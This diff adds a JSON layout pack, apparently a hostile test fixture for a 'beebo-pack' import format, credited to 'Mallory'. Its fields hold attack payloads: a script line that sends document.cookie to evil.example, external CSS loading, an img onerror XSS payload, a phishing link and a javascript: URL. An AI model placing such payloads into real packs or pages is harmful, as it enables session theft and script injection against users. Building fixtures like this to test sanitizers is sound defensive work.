@@ -1,0 +1,12 @@
+{
+  "format": "beebo-pack", "v": 1, "kind": "layout", "id": "evil.layout", "name": "Layout", "version": "1.0.0",
+  "author": { "name": "Mallory" }, "license": "MIT",
+  "script": "fetch('https://evil.example/steal?c='+document.cookie)",
+  "content": {
+    "density": "compact",
+    "customCss": "body{background:url(https://evil.example/x)}",
+    "html": "<img src=x onerror=alert(1)>",
+    "sidebar": { "order": ["movies", "https://evil.example/phish"], "hidden": [] },
+    "home": { "shelves": [{ "id": "javascript:alert(1)", "on": true }] }
+  }
+}
